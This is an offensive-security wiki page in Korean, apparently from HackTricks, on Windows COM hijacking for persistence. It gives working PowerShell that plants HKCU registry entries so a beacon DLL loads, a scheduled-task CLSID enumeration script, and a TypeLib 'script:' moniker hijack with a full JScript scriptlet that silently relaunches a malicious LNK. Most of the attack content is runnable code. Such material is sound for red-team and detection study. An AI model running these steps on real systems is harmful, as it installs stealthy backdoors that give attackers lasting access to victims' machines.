# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 존재하지 않는 COM 구성 요소 검색

사용자가 HKCU 값을 수정할 수 있기 때문에 **COM Hijacking**은 **영구적인 지속성 수단**으로 사용될 수 있습니다. `procmon`을 사용하면 공격자가 지속성을 위해 생성할 수 있는, 검색되었지만 존재하지 않는 COM 레지스트리를 쉽게 찾을 수 있습니다. 필터:

- **RegOpenKey** 작업.
- _Result_가 **NAME NOT FOUND**인 항목.
- _Path_가 **InprocServer32**로 끝나는 항목.

어떤 존재하지 않는 COM을 사칭할지 결정했으면 다음 명령을 실행하세요. _몇 초마다 로드되는 COM을 사칭하기로 결정하면 과도할 수 있으므로 주의하세요._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks는 Custom Triggers를 사용해 COM objects를 호출하며, Task Scheduler를 통해 실행되기 때문에 언제 트리거될지 예측하기가 더 쉽습니다.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

출력을 확인하면 예를 들어 **사용자가 로그인할 때마다** 실행될 항목을 선택할 수 있습니다.

이제 **{1936ED8A-BD93-3213-E325-F38D112938EF}**를 **HKEY\CLASSES\ROOT\CLSID**와 HKLM 및 HKCU에서 검색하면, 일반적으로 해당 값이 HKCU에는 존재하지 않는 것을 알게 됩니다.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
그런 다음 HKCU entry를 만들기만 하면 사용자가 로그인할 때마다 backdoor가 실행됩니다.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib)는 COM 인터페이스를 정의하며 `LoadTypeLib()`를 통해 로드됩니다. COM 서버가 인스턴스화될 때, OS는 `HKCR\TypeLib\{LIBID}` 아래의 레지스트리 키를 참조하여 관련 TypeLib를 로드할 수도 있습니다. TypeLib 경로가 **moniker**로 대체되면(예: `script:C:\...\evil.sct`), TypeLib가 해석될 때 Windows는 해당 scriptlet을 실행합니다 — 일반 구성 요소가 호출될 때 작동하는 은밀한 persistence를 제공합니다.

이 기법은 Microsoft Web Browser control(자주 Internet Explorer, WebBrowser를 임베드한 앱, 심지어 `explorer.exe`에서 로드됨)을 대상으로 관찰되었습니다.

### Steps (PowerShell)

1) 고빈도 CLSID가 사용하는 TypeLib (LIBID)를 식별합니다. 예시로 악성코드 체인에서 자주 남용되는 CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 사용자별 TypeLib 경로를 `script:` 모니커를 사용해 로컬 scriptlet을 가리키도록 설정 (관리자 권한 불필요):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 최소한의 JScript `.sct`를 배치해 primary payload(예: initial chain에서 사용된 `.lnk`)를 재실행시킵니다:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE를 열거나 WebBrowser control을 포함한 애플리케이션을 실행하거나 심지어 일반적인 Explorer 동작만으로도 TypeLib가 로드되어 scriptlet이 실행되며, logon/reboot 시 체인이 다시 활성화됩니다.

정리
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
참고
- 동일한 논리를 다른 사용 빈도가 높은 COM 구성 요소에도 적용할 수 있습니다; 항상 먼저 `HKCR\CLSID\{CLSID}\TypeLib`에서 실제 `LIBID`를 확인하세요.
- 64-bit 시스템에서는 64-bit 소비자를 위해 `win64` 하위키를 채울 수도 있습니다.

## 참고자료

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
